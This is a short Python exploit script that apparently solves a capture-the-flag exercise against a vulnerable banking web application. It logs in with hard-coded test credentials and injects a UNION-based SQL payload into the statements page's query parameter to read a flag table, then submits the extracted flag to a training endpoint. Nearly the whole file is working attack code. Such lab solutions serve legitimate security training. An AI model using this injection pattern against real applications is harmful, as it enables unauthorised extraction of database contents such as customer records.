#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar
import json
import re

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    print("[*] Step 1: Login")
    login_url = f"{url_base}/login"
    login_data = urllib.parse.urlencode({
        'customer_id': 'ALICE001',
        'password': 'password123'
    }).encode()

    req = urllib.request.Request(login_url, data=login_data, method='POST')
    opener.open(req, timeout=10)
    print("[+] Login successful")

    print("[*] Step 2: Access statements (triggers seeding)")
    statements_url = f"{url_base}/statements"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')
    print("[+] Statements page loaded")

    print("[*] Step 3: Try SQLi UNION injection")
    payload = "x' UNION SELECT 1,2,3,4,flag,6,7 FROM ctf_flags WHERE user_id=1#"
    statements_url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    flag_match = re.search(r'BANKSPLOIT\{[A-F0-9]{12}\}', html)
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] FLAG EXTRACTED: {flag}")

        print(f"[*] Step 4: Submit flag to CTF endpoint")
        submit_url = f"{url_base}/api/v1/training/submit-flag"
        submit_data = urllib.parse.urlencode({'flag': flag}).encode()
        req = urllib.request.Request(submit_url, data=submit_data, method='POST')
        response = opener.open(req, timeout=10)
        result = json.loads(response.read().decode('utf-8'))

        if result.get('correct'):
            print(f"[+] FLAG ACCEPTED!")
            print(f"    Message: {result.get('message')}")
            print(f"\nYES - {flag}")
        else:
            print(f"[-] FLAG REJECTED: {result.get('message')}")
            print(f"NO - Flag submission failed (exploitation worked though)")
    else:
        print("[-] Flag not found in response")
        print("NO - SQLi extraction failed")

except Exception as e:
    print(f"NO - {type(e).__name__}: {e}")
